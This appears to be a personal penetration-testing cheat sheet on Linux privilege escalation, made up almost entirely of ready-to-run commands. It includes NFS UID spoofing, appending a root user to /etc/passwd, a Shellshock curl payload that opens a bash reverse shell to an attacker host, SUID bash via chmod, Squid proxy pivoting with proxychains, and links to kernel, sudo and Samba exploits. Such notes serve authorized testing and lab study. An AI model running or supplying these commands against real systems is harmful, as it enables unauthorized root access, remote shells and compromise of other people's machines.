[Linux - Privilege Escalation](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md)<br>
[MySQL User Defined Functions](https://redteamnation.com/mysql-user-defined-functions/)

check if user = root

```shell
cat /etc/mysql/mariadb.conf.d/50-server.cnf | grep user
```

NFS mount privilege

```shell
showmount -e <target ip>
# Export list for <target ip>:
# /home/tester    *
mkdir /tmp/tester
sudo mount -t nfs <target ip>:/home/tester /tmp/tester
find /tmp/tester -ls
# file permission, match uid
# drwxr-xr-x   2 1003     1003         1234 Feb 15 13:59 /tmp/Documents
sudo useradd tester01
sudo usermod -u 1003 tester01
sudo su tester01 -c bash
ls -la /tmp/tester
```

/etc/passwd

```shell
# generating password
openssl passwd -1 -salt 1234 <password>
# openssl passwd -1 -salt 1234 test1234
# $1$1234$LedaKjyvU08i2tNM5HGSg.
# create new user
# echo "test01:\$1\$1234\$LedaKjyvU08i2tNM5HGSg.:0:0:root:/root:/bin/bash" >> /etc/passwd
# su test01
```

ShellShock

```shell
# recon
nikto -url http://<target ip>/cgi-bin
nmap <target ip> -p <target port> --script=http-shellshock --script-args uri=/cgi-bin/home.cgi
# reverse shell
curl -H "User-Agent: () { :; }; /bin/bash -c 'echo aaaa; bash -i >& /dev/tcp/<attacker ip>/<attacker port> 0>&1; echo zzzz;'" http://<target ip>/cgi-bin/home.cgi | sed -n '/aaaa/{:a;n;/zzzz/b;p;ba}'
```

[Escaping Restricted Linux Shells](https://www.sans.org/blog/escaping-restricted-linux-shells/)

```
restricted: cannot specify `/' in command names
```

Squid

```shell
# Usually use port 3128
curl --proxy http://<Squid host ip>:<port> http://<target ip>:<port>
```

using proxychains

```shell
# edit
sudo vim /etc/proxychains4.conf

#socks4  127.0.0.1 9050
#socks5  127.0.0.1 1080

http <Squid host ip> <port>
```

```shell
proxychains nmap -p- -Pn -sT localhost
proxychains nmap -p- -Pn -sT <target ip>
```

using [spose](https://github.com/aancw/spose) to scan open port

```shell
python spose.py --proxy http://<Squid host ip>:<port> --target <target ip>
```

Check if authentication is required. If authentication is required, setting up the proxy directly in Firefox will cause the browser to hang during browsing.

```shell
curl -s --proxy <Squid host ip>:<port> http://<target ip> > /tmp/test.html
firefox /tmp/test.html
```

#### Kernel

[CVE-2022-0847 (DirtyPipe) SUID binary](https://www.exploit-db.com/exploits/50808)

#### Chrome

--remote-debugging-port

```
chrome://inspect/
```

[CVE-2012-0056] memodipper

```
https://www.exploit-db.com/exploits/18411
```

```
exploit/linux/samba/trans2open
```

#### Tasks

```shell
chmod +s /bin/bash
bash -p
```

#### old machine

- Samba versions 2.2.0 to 2.2.8

```
trans2open
```

- Samba 3.0.24

```
https://github.com/mikaelkall/HackingAllTheThings/tree/master/exploit/linux/remote/CVE-2010-0926_smb_symlink_traversal
```

- Compiling the exploit binary sometimes has to be done on the same version of the machine.

- CVE-2020-1938 Ghostcat

- [CVE-2010-3904](https://www.exploit-db.com/exploits/15285) RDS privilege escalation exploit

- [sudo 1.8.31](https://github.com/mohinparamasivam/Sudo-1.8.31-Root-Exploit)
    - If possible, try to compile on the target machine.